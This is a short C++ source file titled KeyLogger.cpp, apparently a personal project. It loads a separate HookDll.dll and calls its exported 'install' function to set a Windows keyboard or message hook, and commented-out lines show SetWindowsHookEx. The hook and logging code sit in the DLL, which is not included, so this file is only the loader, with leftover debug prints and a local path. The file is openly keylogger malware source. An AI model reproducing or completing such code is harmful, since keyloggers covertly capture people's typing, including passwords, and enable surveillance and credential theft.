// KeyLogger.cpp : Defines the entry point for the console application.
//

#include "stdafx.h"
#include <windows.h>
#include <iostream>

void logKey();

int _tmain(int argc, _TCHAR* argv[])
{
	logKey();
	return 0;
}

void logKey() {
	//while (true) {
		static HINSTANCE hinstDLL;
		static HHOOK hhookSysMsg;

		hinstDLL = LoadLibrary(_T("HookDll.dll"));

		if (hinstDLL == NULL)
		{
		  printf("null hinst");
		  printf("cd C:\\Users\\Kodie Glosser\\Documents\\GitHub\\Keylogger\\HookDll\\Debug\\HookDll.dll");
		  return;
		} 

		typedef void (*Install)();
		Install install = (Install)GetProcAddress(hinstDLL, "install");

		//hkprcSysMsg = (HOOKPROC)GetProcAddress(hinstDLL, "install");

		//hhookSysMsg = SetWindowsHookEx(WH_SYSMSGFILTER, hkprcSysMsg, hinstDLL, 0);
		install();
		int i;
		std::cout << hhookSysMsg << std::endl;
		std::cin >> i;
	//}
}
